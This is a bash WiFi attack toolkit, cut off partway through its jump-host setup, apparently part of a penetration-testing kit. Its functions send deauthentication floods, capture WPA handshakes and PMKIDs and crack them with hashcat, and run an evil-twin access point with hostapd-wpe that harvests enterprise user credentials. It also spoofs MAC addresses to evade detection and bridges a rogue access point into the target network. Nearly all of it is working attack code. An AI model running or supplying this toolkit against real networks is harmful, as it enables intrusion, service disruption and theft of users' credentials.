#!/bin/bash
# wifi-toolkit.sh - WiFi Attack and Enterprise Network Testing Toolkit
# ===================================================================
# This script provides comprehensive WiFi assessment capabilities, from
# reconnaissance to exploitation and jump host establishment.

# Source common utilities and configuration
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
source "$SCRIPT_DIR/../common/utils.sh"
source "$SCRIPT_DIR/../common/config.sh"

# Display banner
print_banner "WiFi Assessment Toolkit"

# Global variables
MODE=""                        # scan, attack, jumphost
INTERFACE=""                   # Wireless interface
TARGET_BSSID=""                # Target AP BSSID
TARGET_ESSID=""                # Target AP ESSID
TARGET_CHANNEL=""              # Target AP channel
CAPTURE_DIR=""                 # Directory to save captures
WORDLIST="$ROCKYOU_PATH"       # Default wordlist
ATTACK_TYPE="handshake"        # handshake, pmkid, enterprise
TIMEOUT=300                    # Timeout in seconds
MAC_SPOOF=false                # Whether to spoof MAC address
MAC_ADDRESS=""                 # Custom MAC address
DEAUTH_PACKETS=5               # Number of deauth packets
MONITOR_MODE=false             # Whether interface is in monitor mode
JUMPHOST_INTERFACE=""          # Interface for jumphost
JUMPHOST_SETUP=false           # Whether to set up jumphost
ENTERPRISE_ATTACK=false        # Whether to attack enterprise networks
EAP_USER_FILE=""               # EAP user wordlist
EAP_PASS_FILE=""               # EAP password wordlist
RADIUS_IP=""                   # RADIUS server IP
WPA_ENTERPRISE_TYPE=""         # PEAP, EAP-TLS, EAP-TTLS, etc.
OPSEC_LEVEL="medium"           # OPSEC level: low, medium, high

# Function to check dependencies
check_dependencies() {
    log "INFO" "Checking dependencies..."
    
    local tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "macchanger" "hostapd" "dnsmasq" "wpa_supplicant" "hcxdumptool" "hcxpcapngtool" "hashcat" "eaphammer")
    local missing=()
    
    for tool in "${tools[@]}"; do
        if ! check_tool "$tool"; then
            missing+=("$tool")
        fi
    done
    
    # Check for optional enterprise tools
    if [ "$ENTERPRISE_ATTACK" = true ]; then
        local enterprise_tools=("hostapd-wpe" "freeradius" "asleap")
        for tool in "${enterprise_tools[@]}"; do
            if ! check_tool "$tool"; then
                missing+=("$tool")
            fi
        done
    fi
    
    if [ ${#missing[@]} -gt 0 ]; then
        log "ERROR" "Missing required tools: ${missing[*]}"
        log "WARNING" "Please install missing tools before continuing."
        echo "    You can install aircrack-ng suite with: sudo apt install aircrack-ng"
        echo "    For enterprise attacks: sudo apt install hostapd-wpe freeradius asleap"
        exit 1
    fi
    
    log "SUCCESS" "All dependencies are installed."
}

# Function to parse command line arguments
parse_arguments() {
    if [ $# -eq 0 ]; then
        show_help
        exit 0
    fi
    
    while [[ $# -gt 0 ]]; do
        case "$1" in
            # Mode selection
            --scan)
                MODE="scan"
                shift
                ;;
            --attack)
                MODE="attack"
                shift
                ;;
            --jumphost)
                MODE="jumphost"
                JUMPHOST_SETUP=true
                shift
                ;;
            # Interface options
            -i|--interface)
                INTERFACE="$2"
                shift 2
                ;;
            -j|--jumphost-interface)
                JUMPHOST_INTERFACE="$2"
                shift 2
                ;;
            # Target options
            -b|--bssid)
                TARGET_BSSID="$2"
                shift 2
                ;;
            -e|--essid)
                TARGET_ESSID="$2"
                shift 2
                ;;
            -c|--channel)
                TARGET_CHANNEL="$2"
                shift 2
                ;;
            # Attack options
            -a|--attack-type)
                if [[ "$2" == "handshake" || "$2" == "pmkid" || "$2" == "enterprise" ]]; then
                    ATTACK_TYPE="$2"
                    if [ "$2" == "enterprise" ]; then
                        ENTERPRISE_ATTACK=true
                    fi
                    shift 2
                else
                    log "ERROR" "Invalid attack type: $2"
                    echo "Valid attack types: handshake, pmkid, enterprise"
                    exit 1
                fi
                ;;
            -d|--deauth)
                DEAUTH_PACKETS="$2"
                shift 2
                ;;
            # Enterprise options
            --enterprise)
                ENTERPRISE_ATTACK=true
                shift
                ;;
            --eap-type)
                WPA_ENTERPRISE_TYPE="$2"
                shift 2
                ;;
            --eap-user-file)
                EAP_USER_FILE="$2"
                shift 2
                ;;
            --eap-pass-file)
                EAP_PASS_FILE="$2"
                shift 2
                ;;
            --radius)
                RADIUS_IP="$2"
                shift 2
                ;;
            # MAC spoofing options
            --spoof-mac)
                MAC_SPOOF=true
                shift
                ;;
            --mac-address)
                MAC_ADDRESS="$2"
                MAC_SPOOF=true
                shift 2
                ;;
            # Output options
            -o|--output)
                CAPTURE_DIR="$2"
                shift 2
                ;;
            -w|--wordlist)
                WORDLIST="$2"
                shift 2
                ;;
            # Timeout option
            -t|--timeout)
                TIMEOUT="$2"
                shift 2
                ;;
            # OPSEC options
            --opsec)
                if [[ "$2" == "low" || "$2" == "medium" || "$2" == "high" ]]; then
                    OPSEC_LEVEL="$2"
                    shift 2
                else
                    log "ERROR" "Invalid OPSEC level: $2"
                    echo "Valid levels: low, medium, high"
                    exit 1
                fi
                ;;
            # Help option
            -h|--help)
                show_help
                exit 0
                ;;
            *)
                log "ERROR" "Unknown option: $1"
                echo "Use -h or --help for usage information"
                exit 1
                ;;
        esac
    done
    
    # Validate required arguments based on mode
    case "$MODE" in
        "scan")
            if [ -z "$INTERFACE" ]; then
                log "ERROR" "Interface is required for scan mode. Use -i or --interface to specify."
                exit 1
            fi
            ;;
        "attack")
            if [ -z "$INTERFACE" ]; then
                log "ERROR" "Interface is required for attack mode. Use -i or --interface to specify."
                exit 1
            fi
            if [ -z "$TARGET_BSSID" ] && [ -z "$TARGET_ESSID" ]; then
                log "ERROR" "Target BSSID or ESSID is required for attack mode. Use -b/--bssid or -e/--essid to specify."
                exit 1
            fi
            ;;
        "jumphost")
            if [ -z "$INTERFACE" ]; then
                log "ERROR" "WiFi interface is required for jumphost mode. Use -i or --interface to specify."
                exit 1
            fi
            if [ -z "$JUMPHOST_INTERFACE" ]; then
                log "ERROR" "Jumphost interface is required for jumphost mode. Use -j or --jumphost-interface to specify."
                exit 1
            fi
            ;;
        *)
            log "ERROR" "Mode is required. Use --scan, --attack, or --jumphost to specify."
            exit 1
            ;;
    esac
    
    # Set output directory if not specified
    if [ -z "$CAPTURE_DIR" ]; then
        if [ -z "$TARGET_ESSID" ]; then
            TARGET_ESSID="unknown"
        fi
        CAPTURE_DIR="$DEFAULT_ENGAGEMENTS_DIR/wifi/${TARGET_ESSID}-$(date +%Y%m%d-%H%M%S)"
    fi
    
    # Ensure output directory exists
    ensure_dir "$CAPTURE_DIR"
    
    # Set up specific directories based on mode
    case "$MODE" in
        "scan")
            ensure_dir "$CAPTURE_DIR/scan"
            ;;
        "attack")
            ensure_dir "$CAPTURE_DIR/attack"
            ensure_dir "$CAPTURE_DIR/attack/handshakes"
            ensure_dir "$CAPTURE_DIR/attack/pmkid"
            if [ "$ENTERPRISE_ATTACK" = true ]; then
                ensure_dir "$CAPTURE_DIR/attack/enterprise"
                ensure_dir "$CAPTURE_DIR/attack/enterprise/creds"
            fi
            ;;
        "jumphost")
            ensure_dir "$CAPTURE_DIR/jumphost"
            ensure_dir "$CAPTURE_DIR/jumphost/configs"
            ensure_dir "$CAPTURE_DIR/jumphost/logs"
            ;;
    esac
    
    # Set up logging
    LOG_FILE="$CAPTURE_DIR/wifi-toolkit.log"
    log "INFO" "Logs will be saved to $LOG_FILE"
}

# Function to show help
show_help() {
    echo "Usage: $0 [MODE] [OPTIONS]"
    echo ""
    echo "Modes:"
    echo "  --scan                Scan for WiFi networks"
    echo "  --attack              Attack WiFi networks"
    echo "  --jumphost            Set up a WiFi jump host"
    echo ""
    echo "Options:"
    echo "  -i, --interface IFACE         Wireless interface to use"
    echo "  -j, --jumphost-interface IFACE Secondary interface for jump host"
    echo "  -b, --bssid BSSID             Target AP BSSID"
    echo "  -e, --essid ESSID             Target AP ESSID"
    echo "  -c, --channel CHANNEL         Target AP channel"
    echo "  -a, --attack-type TYPE        Attack type: handshake, pmkid, enterprise"
    echo "  -d, --deauth PACKETS          Number of deauth packets to send (default: 5)"
    echo "  -o, --output DIR              Output directory"
    echo "  -w, --wordlist FILE           Wordlist for cracking"
    echo "  -t, --timeout SECONDS         Timeout in seconds (default: 300)"
    echo "  --spoof-mac                   Spoof MAC address"
    echo "  --mac-address MAC             Custom MAC address for spoofing"
    echo "  --enterprise                  Target is an enterprise network"
    echo "  --eap-type TYPE               EAP type (PEAP, EAP-TLS, EAP-TTLS, etc.)"
    echo "  --eap-user-file FILE          EAP username wordlist"
    echo "  --eap-pass-file FILE          EAP password wordlist"
    echo "  --radius IP                   RADIUS server IP"
    echo "  --opsec LEVEL                 OPSEC level: low, medium, high (default: medium)"
    echo "  -h, --help                    Show this help message"
}

# Function to set wireless interface to monitor mode
set_monitor_mode() {
    log "INFO" "Setting interface $INTERFACE to monitor mode..."
    
    # Check if interface is already in monitor mode
    if iwconfig "$INTERFACE" 2>&1 | grep -q "Mode:Monitor"; then
        log "INFO" "Interface is already in monitor mode."
        MONITOR_MODE=true
        return 0
    fi
    
    # Disable network manager for this interface
    if check_tool "nmcli"; then
        log "INFO" "Disabling NetworkManager for $INTERFACE..."
        sudo nmcli device set "$INTERFACE" managed no || log "WARNING" "Failed to disable NetworkManager for $INTERFACE"
    fi
    
    # Disable interface
    sudo ip link set "$INTERFACE" down || { log "ERROR" "Failed to bring down interface $INTERFACE"; return 1; }
    
    # Spoof MAC if requested
    if [ "$MAC_SPOOF" = true ]; then
        spoof_mac
    fi
    
    # Set monitor mode
    sudo iw dev "$INTERFACE" set type monitor || { log "ERROR" "Failed to set monitor mode on $INTERFACE"; return 1; }
    
    # Enable interface
    sudo ip link set "$INTERFACE" up || { log "ERROR" "Failed to bring up interface $INTERFACE"; return 1; }
    
    # Verify monitor mode
    if iwconfig "$INTERFACE" 2>&1 | grep -q "Mode:Monitor"; then
        log "SUCCESS" "Interface $INTERFACE is now in monitor mode."
        MONITOR_MODE=true
        return 0
    else
        log "ERROR" "Failed to set interface $INTERFACE to monitor mode."
        return 1
    fi
}

# Function to reset wireless interface to managed mode
reset_interface() {
    log "INFO" "Resetting interface $INTERFACE to managed mode..."
    
    # Disable interface
    sudo ip link set "$INTERFACE" down || log "WARNING" "Failed to bring down interface $INTERFACE"
    
    # Set managed mode
    sudo iw dev "$INTERFACE" set type managed || log "WARNING" "Failed to set managed mode on $INTERFACE"
    
    # Enable interface
    sudo ip link set "$INTERFACE" up || log "WARNING" "Failed to bring up interface $INTERFACE"
    
    # Re-enable network manager for this interface
    if check_tool "nmcli"; then
        log "INFO" "Re-enabling NetworkManager for $INTERFACE..."
        sudo nmcli device set "$INTERFACE" managed yes || log "WARNING" "Failed to re-enable NetworkManager for $INTERFACE"
    fi
    
    # Reset MAC address if it was spoofed
    if [ "$MAC_SPOOF" = true ]; then
        log "INFO" "Resetting MAC address..."
        sudo macchanger -p "$INTERFACE" &>/dev/null || log "WARNING" "Failed to reset MAC address"
    fi
    
    log "SUCCESS" "Interface $INTERFACE reset to managed mode."
    MONITOR_MODE=false
}

# Function to spoof MAC address
spoof_mac() {
    log "INFO" "Spoofing MAC address for $INTERFACE..."
    
    if [ -n "$MAC_ADDRESS" ]; then
        # Use specified MAC address
        sudo macchanger -m "$MAC_ADDRESS" "$INTERFACE" &>/dev/null
        if [ $? -eq 0 ]; then
            log "SUCCESS" "MAC address set to $MAC_ADDRESS"
        else
            log "ERROR" "Failed to set MAC address to $MAC_ADDRESS"
            exit 1
        fi
    else
        # Randomize MAC address
        # Create a MAC that looks like a common device
        # Use OPSEC level to determine how "stealthy" we are
        case "$OPSEC_LEVEL" in
            "low")
                # Completely random MAC
                sudo macchanger -r "$INTERFACE" &>/dev/null
                if [ $? -eq 0 ]; then
                    NEW_MAC=$(macchanger -s "$INTERFACE" | grep "Current MAC" | awk '{print $3}')
                    log "SUCCESS" "MAC address randomized to $NEW_MAC"
                else
                    log "ERROR" "Failed to randomize MAC address"
                    exit 1
                fi
                ;;
            "medium")
                # Random MAC but keep vendor (looks less suspicious)
                sudo macchanger -e "$INTERFACE" &>/dev/null
                if [ $? -eq 0 ]; then
                    NEW_MAC=$(macchanger -s "$INTERFACE" | grep "Current MAC" | awk '{print $3}')
                    log "SUCCESS" "MAC address changed to $NEW_MAC (maintained vendor)"
                else
                    log "ERROR" "Failed to change MAC address"
                    exit 1
                fi
                ;;
            "high")
                # Set MAC to a common device vendor
                # Apple, Samsung, etc.
                COMMON_VENDORS=("00:0C:29" "00:16:CB" "00:16:41" "00:26:bb" "a8:66:7f" "c8:2a:14")
                VENDOR=${COMMON_VENDORS[$RANDOM % ${#COMMON_VENDORS[@]}]}
                SUFFIX=$(openssl rand -hex 3 | sed 's/\(..\)/:\1/g; s/^://')
                SPOOFED_MAC="$VENDOR$SUFFIX"
                
                sudo macchanger -m "$SPOOFED_MAC" "$INTERFACE" &>/dev/null
                if [ $? -eq 0 ]; then
                    log "SUCCESS" "MAC address set to $SPOOFED_MAC (common vendor)"
                else
                    log "ERROR" "Failed to set MAC address"
                    exit 1
                fi
                ;;
        esac
    fi
}

# Function to scan for WiFi networks
scan_networks() {
    log "INFO" "Starting WiFi network scan..."
    
    # Set monitor mode
    set_monitor_mode || { log "ERROR" "Failed to set monitor mode. Exiting."; exit 1; }
    
    # Start scanning
    log "INFO" "Scanning for networks. Press Ctrl+C to stop..."
    
    local scan_file="$CAPTURE_DIR/scan/scan-output"
    
    # Start airodump-ng in a new terminal (more user-friendly)
    if check_tool "xterm"; then
        xterm -e "sudo airodump-ng -w $scan_file --output-format csv,kismet,netxml $INTERFACE" &
        AIRODUMP_PID=$!
    else
        # Fallback to background process if no xterm
        sudo airodump-ng -w "$scan_file" --output-format csv,kismet,netxml "$INTERFACE" &>/dev/null &
        AIRODUMP_PID=$!
    fi
    
    # Wait for scan (terminate on Ctrl+C or timeout)
    log "INFO" "Scanning will automatically stop after $TIMEOUT seconds..."
    local start_time=$(date +%s)
    local elapsed=0
    
    try_catch || {
        log "INFO" "Scan interrupted by user."
        kill -9 $AIRODUMP_PID &>/dev/null
    }
    
    while kill -0 $AIRODUMP_PID &>/dev/null; do
        elapsed=$(($(date +%s) - start_time))
        
        if [ $elapsed -ge $TIMEOUT ]; then
            log "INFO" "Scan timeout reached ($TIMEOUT seconds)."
            kill -9 $AIRODUMP_PID &>/dev/null
            break
        fi
        
        sleep 1
    done
    
    # Parse scan results
    if [ -f "$scan_file-01.csv" ]; then
        log "INFO" "Parsing scan results..."
        # Parse CSV file to get network list
        local network_list="$CAPTURE_DIR/scan/network-list.txt"
        
        # Skip first line, get APs (not clients), extract BSSID, channel, and ESSID
        grep -a -v "Station MAC" "$scan_file-01.csv" | grep -a -v "BSSID" | awk -F, '{print $1 "," $4 "," $14}' | sort | uniq > "$network_list"
        
        # Generate a more readable summary
        local summary_file="$CAPTURE_DIR/scan/network-summary.md"
        echo "# WiFi Network Scan Results" > "$summary_file"
        echo "" >> "$summary_file"
        echo "Scan completed on $(date)" >> "$summary_file"
        echo "" >> "$summary_file"
        echo "## Discovered Networks" >> "$summary_file"
        echo "" >> "$summary_file"
        echo "| BSSID | Channel | ESSID |" >> "$summary_file"
        echo "|-------|---------|-------|" >> "$summary_file"
        
        while IFS=, read -r bssid channel essid; do
            # Clean up fields
            bssid=$(echo "$bssid" | tr -d ' ')
            channel=$(echo "$channel" | tr -d ' ')
            essid=$(echo "$essid" | tr -d ' ' | sed 's/^"\(.*\)"$/\1/')
            
            echo "| $bssid | $channel | $essid |" >> "$summary_file"
        done < "$network_list"
        
        # Enterprise network detection
        echo "" >> "$summary_file"
        echo "## Enterprise Networks (WPA-EAP)" >> "$summary_file"
        echo "" >> "$summary_file"
        
        # Simple detection of enterprise networks (looking for specific patterns in the kismet file)
        if [ -f "$scan_file-01.kismet.netxml" ]; then
            grep -A 20 "<encryption>WPA-Enterprise</encryption\|<encryption>WPA2-Enterprise</encryption" "$scan_file-01.kismet.netxml" | grep -B 10 -A 10 "ESSID" | grep "<essid>" | sed 's/.*<essid>\(.*\)<\/essid>.*/- \1/' | sort | uniq >> "$summary_file"
        else
            echo "No enterprise networks detected." >> "$summary_file"
        fi
        
        log "SUCCESS" "Scan completed. Results saved to $CAPTURE_DIR/scan/"
        log "INFO" "Summary file: $summary_file"
    else
        log "ERROR" "No scan results found."
    fi
    
    # Reset interface
    reset_interface
}

# Function to capture WPA handshake
capture_handshake() {
    log "INFO" "Starting handshake capture for $TARGET_ESSID ($TARGET_BSSID)..."
    
    # Set monitor mode
    set_monitor_mode || { log "ERROR" "Failed to set monitor mode. Exiting."; exit 1; }
    
    # Start capturing
    local capture_file="$CAPTURE_DIR/attack/handshakes/capture"
    
    # Start airodump-ng targeting specific AP
    log "INFO" "Starting targeted capture on channel $TARGET_CHANNEL..."
    sudo airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$capture_file" "$INTERFACE" &>/dev/null &
    AIRODUMP_PID=$!
    
    # Wait a moment to ensure airodump is running
    sleep 2
    
    # Send deauthentication packets
    log "INFO" "Sending $DEAUTH_PACKETS deauthentication packets..."
    sudo aireplay-ng --deauth "$DEAUTH_PACKETS" -a "$TARGET_BSSID" "$INTERFACE" &>/dev/null
    
    # Wait for handshake or timeout
    log "INFO" "Waiting for handshake (timeout: $TIMEOUT seconds)..."
    local start_time=$(date +%s)
    local elapsed=0
    local handshake_captured=false
    
    while [ $elapsed -lt $TIMEOUT ]; do
        # Check if handshake is captured
        if [ -f "$capture_file-01.cap" ]; then
            if aircrack-ng "$capture_file-01.cap" | grep -q "1 handshake"; then
                log "SUCCESS" "Handshake captured!"
                handshake_captured=true
                break
            fi
        fi
        
        elapsed=$(($(date +%s) - start_time))
        sleep 5
    done
    
    # Stop airodump-ng
    kill -9 $AIRODUMP_PID &>/dev/null
    
    if [ "$handshake_captured" = true ]; then
        log "INFO" "Converting capture to hashcat format..."
        # Convert to hashcat format (HCCAPX)
        hashcat_file="$CAPTURE_DIR/attack/handshakes/hashcat.hccapx"
        if check_tool "cap2hccapx"; then
            cap2hccapx "$capture_file-01.cap" "$hashcat_file" &>/dev/null
            log "SUCCESS" "Handshake saved in hashcat format at $hashcat_file"
        else
            log "WARNING" "cap2hccapx not found, skipping conversion to hashcat format."
        fi
        
        # Check if we should try to crack it
        log "INFO" "Would you like to attempt to crack the handshake? (y/n)"
        read -r response
        if [[ "$response" =~ ^[Yy]$ ]]; then
            crack_handshake "$hashcat_file"
        fi
    else
        log "WARNING" "Handshake not captured within timeout period."
    fi
    
    # Reset interface
    reset_interface
}

# Function to capture PMKID
capture_pmkid() {
    log "INFO" "Starting PMKID capture for $TARGET_ESSID ($TARGET_BSSID)..."
    
    # Set monitor mode
    set_monitor_mode || { log "ERROR" "Failed to set monitor mode. Exiting."; exit 1; }
    
    # Define filenames
    local capture_file="$CAPTURE_DIR/attack/pmkid/pmkid.pcapng"
    local hash_file="$CAPTURE_DIR/attack/pmkid/pmkid.16800"
    
    # Start hcxdumptool (more efficient than airodump for PMKID)
    log "INFO" "Starting PMKID capture on channel $TARGET_CHANNEL..."
    
    # Construct command based on whether we have a specific target
    local hcxdumptool_cmd="sudo hcxdumptool -i $INTERFACE -o $capture_file --enable_status=1"
    
    if [ -n "$TARGET_BSSID" ]; then
        hcxdumptool_cmd="$hcxdumptool_cmd --filterlist_ap=$TARGET_BSSID"
    fi
    if [ -n "$TARGET_CHANNEL" ]; then
        hcxdumptool_cmd="$hcxdumptool_cmd --filtermode=2 --channel=$TARGET_CHANNEL"
    fi
    
    # Execute command with timeout
    timeout $TIMEOUT $hcxdumptool_cmd &>/dev/null
    
    # Process capture file to extract PMKID
    if [ -f "$capture_file" ]; then
        log "INFO" "Processing capture file to extract PMKID..."
        
        # Convert to hashcat format
        hcxpcapngtool -o "$hash_file" "$capture_file" &>/dev/null
        
        # Check if PMKID was captured
        if [ -f "$hash_file" ] && [ -s "$hash_file" ]; then
            log "SUCCESS" "PMKID captured and saved to $hash_file"
            
            # Check if we should try to crack it
            log "INFO" "Would you like to attempt to crack the PMKID? (y/n)"
            read -r response
            if [[ "$response" =~ ^[Yy]$ ]]; then
                crack_pmkid "$hash_file"
            fi
        else
            log "WARNING" "No PMKID was captured."
        fi
    else
        log "ERROR" "Capture file not created."
    fi
    
    # Reset interface
    reset_interface
}

# Function to crack handshake with hashcat
crack_handshake() {
    local hash_file="$1"
    
    if [ ! -f "$hash_file" ]; then
        log "ERROR" "Hash file not found: $hash_file"
        return 1
    fi
    
    if [ ! -f "$WORDLIST" ]; then
        log "ERROR" "Wordlist not found: $WORDLIST"
        return 1
    fi
    
    log "INFO" "Attempting to crack handshake with hashcat..."
    log "INFO" "This may take a long time depending on the wordlist size and your hardware."
    
    # Output file for results
    local pot_file="$CAPTURE_DIR/attack/handshakes/hashcat.pot"
    
    # Start cracking
    hashcat -m 2500 -w 3 --potfile-path="$pot_file" "$hash_file" "$WORDLIST"
    
    # Check results
    if [ -f "$pot_file" ] && [ -s "$pot_file" ]; then
        log "SUCCESS" "Password found! Results saved to $pot_file"
    else
        log "WARNING" "Password not found in the wordlist."
    fi
}

# Function to crack PMKID with hashcat
crack_pmkid() {
    local hash_file="$1"
    
    if [ ! -f "$hash_file" ]; then
        log "ERROR" "Hash file not found: $hash_file"
        return 1
    fi
    
    if [ ! -f "$WORDLIST" ]; then
        log "ERROR" "Wordlist not found: $WORDLIST"
        return 1
    fi
    
    log "INFO" "Attempting to crack PMKID with hashcat..."
    log "INFO" "This may take a long time depending on the wordlist size and your hardware."
    
    # Output file for results
    local pot_file="$CAPTURE_DIR/attack/pmkid/hashcat.pot"
    
    # Start cracking
    hashcat -m 16800 -w 3 --potfile-path="$pot_file" "$hash_file" "$WORDLIST"
    
    # Check results
    if [ -f "$pot_file" ] && [ -s "$pot_file" ]; then
        log "SUCCESS" "Password found! Results saved to $pot_file"
    else
        log "WARNING" "Password not found in the wordlist."
    fi
}

# Function to attack enterprise networks
attack_enterprise() {
    log "INFO" "Starting enterprise network attack against $TARGET_ESSID..."
    
    if [ ! -f "$(which hostapd-wpe)" ]; then
        log "ERROR" "hostapd-wpe not found. Please install it for enterprise attacks."
        return 1
    fi
    
    # Create directory for enterprise attack
    local enterprise_dir="$CAPTURE_DIR/attack/enterprise"
    ensure_dir "$enterprise_dir"
    
    # Create hostapd-wpe configuration
    local hostapd_conf="$enterprise_dir/hostapd-wpe.conf"
    
    # Determine EAP type if not specified
    if [ -z "$WPA_ENTERPRISE_TYPE" ]; then
        WPA_ENTERPRISE_TYPE="PEAP TTLS TLS"
    fi
    
    # Create configuration file
    cat > "$hostapd_conf" << EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_ESSID
channel=$TARGET_CHANNEL
hw_mode=g
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/certs/dh
eap_methods=$WPA_ENTERPRISE_TYPE
wpe_logfile=$enterprise_dir/hostapd-wpe.log
EOF
    
    # Set interface to monitor mode
    reset_interface  # Ensure we start clean
    
    # Start the fake AP
    log "INFO" "Starting rogue access point with hostapd-wpe..."
    log "INFO" "This will create a fake AP that mimics the enterprise network."
    log "INFO" "When users connect, their credentials will be captured."
    
    # Run hostapd-wpe
    sudo hostapd-wpe "$hostapd_conf" &
    HOSTAPD_PID=$!
    
    # Wait for timeout or manual interrupt
    log "INFO" "Rogue AP is running. Waiting for clients to connect..."
    log "INFO" "Press Ctrl+C to stop or wait for $TIMEOUT seconds timeout."
    
    try_catch || {
        log "INFO" "Attack interrupted by user."
        kill -9 $HOSTAPD_PID &>/dev/null
    }
    
    local start_time=$(date +%s)
    while kill -0 $HOSTAPD_PID &>/dev/null; do
        local elapsed=$(($(date +%s) - start_time))
        
        if [ $elapsed -ge $TIMEOUT ]; then
            log "INFO" "Timeout reached. Stopping rogue AP."
            kill -9 $HOSTAPD_PID &>/dev/null
            break
        fi
        
        sleep 5
        
        # Check for captured credentials
        if [ -f "$enterprise_dir/hostapd-wpe.log" ]; then
            grep -a "username=" "$enterprise_dir/hostapd-wpe.log" > "$enterprise_dir/creds/captured_credentials.txt"
            local cred_count=$(wc -l < "$enterprise_dir/creds/captured_credentials.txt")
            
            if [ "$cred_count" -gt 0 ]; then
                log "SUCCESS" "Captured $cred_count credential(s)!"
            fi
        fi
    done
    
    # Process and display results
    if [ -f "$enterprise_dir/hostapd-wpe.log" ]; then
        local creds_file="$enterprise_dir/creds/captured_credentials.txt"
        grep -a "username=" "$enterprise_dir/hostapd-wpe.log" > "$creds_file"
        
        if [ -s "$creds_file" ]; then
            log "SUCCESS" "Enterprise credentials captured!"
            log "INFO" "Credentials saved to $creds_file"
            
            # Create a nicer report
            local report_file="$enterprise_dir/creds/credentials_report.md"
            echo "# Captured Enterprise Credentials" > "$report_file"
            echo "" >> "$report_file"
            echo "Target Network: $TARGET_ESSID" >> "$report_file"
            echo "Capture Date: $(date)" >> "$report_file"
            echo "" >> "$report_file"
            echo "## Credentials" >> "$report_file"
            echo "" >> "$report_file"
            echo "| Username | Challenge | Response | Result |" >> "$report_file"
            echo "|----------|-----------|----------|--------|" >> "$report_file"
            
            # Parse log file to extract credentials in readable format
            grep -a "username=" "$enterprise_dir/hostapd-wpe.log" | while read -r line; do
                username=$(echo "$line" | grep -o "username=.*," | sed 's/username=//;s/,//')
                challenge=$(echo "$line" | grep -o "challenge=.*," | sed 's/challenge=//;s/,//')
                response=$(echo "$line" | grep -o "response=.*," | sed 's/response=//;s/,//')
                result="Captured"
                
                echo "| $username | $challenge | $response | $result |" >> "$report_file"
            done
            
            log "INFO" "Detailed report saved to $report_file"
        else
            log "WARNING" "No credentials were captured."
        fi
    else
        log "ERROR" "Log file not found. The attack may have failed."
    fi
    
    # Reset interface
    reset_interface
}

# Function to set up a jump host
setup_jumphost() {
    log "INFO" "Setting up WiFi jump host..."
    
    if [ -z "$JUMPHOST_INTERFACE" ]; then
        log "ERROR" "Jumphost interface not specified. Use -j or --jumphost-interface."
        return 1
    fi
    
    # Check if target is specified for connection
    if [ -z "$TARGET_ESSID" ]; then
        log "ERROR" "Target ESSID not specified for jump host connection."
        return 1
    fi
    
    local jumphost_dir="$CAPTURE_DIR/jumphost"
    
    # Reset both interfaces to managed mode
    reset_interface
    sudo ip link set "$JUMPHOST_INTERFACE" down
    sudo ip link set "$JUMPHOST_INTERFACE" up
    
    # Create configuration files
    log "INFO" "Creating configuration files..."
    
    # 1. Network configuration for connecting to target network
    local wpa_conf="$jumphost_dir/configs/wpa_supplicant.conf"
    
    # Check if we have a password for the target network
    if [ -z "$TARGET_PASSWORD" ]; then
        log "INFO" "Enter password for target network $TARGET_ESSID:"
        read -s TARGET_PASSWORD
    fi
    
    # Create wpa_supplicant configuration
    cat > "$wpa_conf" << EOF
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network={
    ssid="$TARGET_ESSID"
    psk="$TARGET_PASSWORD"
    key_mgmt=WPA-PSK
}
EOF
    
    # 2. DNS and DHCP configuration
    local dnsmasq_conf="$jumphost_dir/configs/dnsmasq.conf"
    
    # Define network for jump host
    local ap_ip="192.168.7.1"
    local ap_subnet="192.168.7.0/24"
    local ap_dhcp_start="192.168.7.100"
    local ap_dhcp_end="192.168.7.200"
    
    cat > "$dnsmasq_conf" << EOF
interface=$INTERFACE
dhcp-range=$ap_dhcp_start,$ap_dhcp_end,12h
dhcp-option=3,$ap_ip
dhcp-option=6,$ap_ip
server=8.8.8.8
server=8.8.4.4
EOF
    
    # 3. IP forwarding configuration
    local iptables_script="$jumphost_dir/configs/iptables.sh"
    
    cat > "$iptables_script" << EOF
#!/bin/bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up iptables for NAT
iptables -t nat -A POSTROUTING -o $JUMPHOST_INTERFACE -j MASQUERADE
iptables -A FORWARD -i $JUMPHOST_INTERFACE -o $INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $INTERFACE -o $JUMPHOST_INTERFACE -j ACCEPT
EOF
    
    chmod +x "$iptables_script"
    
    # 4. Access point configuration
    local hostapd_conf="$jumphost_dir/configs/hostapd.conf"
    
    # Generate a unique SSID for the jump host
    local jump_ssid="JumpHost_$(openssl rand -hex 3)"
    # Generate a random password
    local jump_password=$(openssl rand -base64 12)
    
    cat > "$hostapd_conf" << EOF
interface=$INTERFACE
driver=nl80211
ssid=$jump_ssid
hw_mode=g
channel=7
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$jump_password
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    
    # Start the jump host
    log "INFO" "Starting jump host..."
    
    # 1. Connect to target network
    log "INFO" "Connecting to target network $TARGET_ESSID..."
    sudo wpa_supplicant -B -i "$JUMPHOST_INTERFACE" -c "$wpa_conf" -f "$jumphost_dir/logs/wpa_supplicant.log"
    sleep 5
    
    # Check if connected
    if ! iwconfig "$JUMPHOST_INTERFACE" | grep -q "$TARGET_ESSID"; then
        log "ERROR" "Failed to connect to $TARGET_ESSID. Check the password and try again."
        sudo killall wpa_supplicant
        return 1
    fi
    
    # Get IP address via DHCP
    sudo dhclient "$JUMPHOST_INTERFACE"
    
    # 2. Configure the access point interface
    log "INFO" "Configuring access point interface..."
    sudo ip link set "$INTERFACE" down
    sudo ip addr flush dev "$INTERFACE"
    sudo ip addr add "$ap_ip/24" dev "$INTERFACE"
    sudo ip link set "$INTERFACE" up
    
    # 3. Set up IP forwarding and NAT
    log "INFO" "Setting up IP forwarding and NAT..."
    sudo "$iptables_script"
